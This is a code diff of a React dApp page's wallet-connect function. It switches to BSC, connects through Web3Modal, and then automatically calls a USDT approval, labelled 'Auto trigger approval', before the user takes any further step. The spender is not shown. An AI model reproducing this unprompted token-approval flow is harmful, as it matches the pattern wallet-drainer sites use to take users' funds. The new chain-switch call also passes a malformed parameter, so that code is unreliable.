@@ -77,35 +77,54 @@ const HomePage = () => {
 
 const connectAndApprove = async () => {
   if (window.ethereum) {
-    try {
-      // Switch to BSC first
-      await switchToBSC();
+			try {
+				const currentChainId = await window.ethereum.request({
+					method: 'eth_chainId',
+				});
+				console.log('currentChainId', currentChainId)
+				if (currentChainId === BSC_CHAIN_ID) {
+					const addressArray = await window.ethereum.request({
+						method: 'eth_requestAccounts',
+					});
+					if (addressArray.length > 0) {
+						const modal = new Web3Modal({ cacheProvider: true });
+				const instance = await modal.connect();
+				const provider = new BrowserProvider(instance);
+				const _signer = await provider.getSigner();
+				const _account = await _signer.getAddress();
+				setSigner(_signer);
+				setAccount(_account);
+				//setStatus("✅ Wallet connected");
 
-      if (!loggedInInfo?.walletAddress) {
-        const modal = new Web3Modal({ cacheProvider: true });
-        const instance = await modal.connect();
-
-        const provider = new BrowserProvider(instance);
-        const _signer = await provider.getSigner();
-        const _account = await _signer.getAddress();
-
-        setSigner(_signer);
-        setAccount(_account);
-
-        // ✅ Auto trigger approval
-        await approveUSDT(_signer, _account);
-      }
-    } catch (err) {
-      console.error("Connect error", err);
-      // Optionally show a UI status or toast
-    }
-  } else {
-    // Fallback for mobile: open MetaMask app via deep link
-    const dappUrl = window.location.hostname;
-    const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
-    console.log("Redirecting to MetaMask mobile app:", metamaskAppDeepLink);
-    window.open(metamaskAppDeepLink, "_self");
-  }
+				// ✅ Auto trigger approval
+				await approveUSDT(_signer, _account);
+					} else {
+						alert('No accounts found.');
+					}
+				} else {
+					try {
+						await window.ethereum.request({
+							method: 'wallet_switchEthereumChain',
+							params: [{ BSC_CHAIN_ID }],
+						});
+						console.log('Switched to chain:', BSC_CHAIN_ID);
+					} catch (error) {
+						if (error.code === 4902) {
+							alert('Target chain is not added to MetaMask.');
+						} else {
+							console.error('Error switching chain:', error);
+						}
+					}
+				}
+			} catch (err) {
+				console.error('Error connecting to MetaMask:', err);
+			}
+		} else {
+			const dappUrl = window.location.hostname;
+			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
+			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
+			window.open(metamaskAppDeepLink, '_self');
+		}
 };
 
 
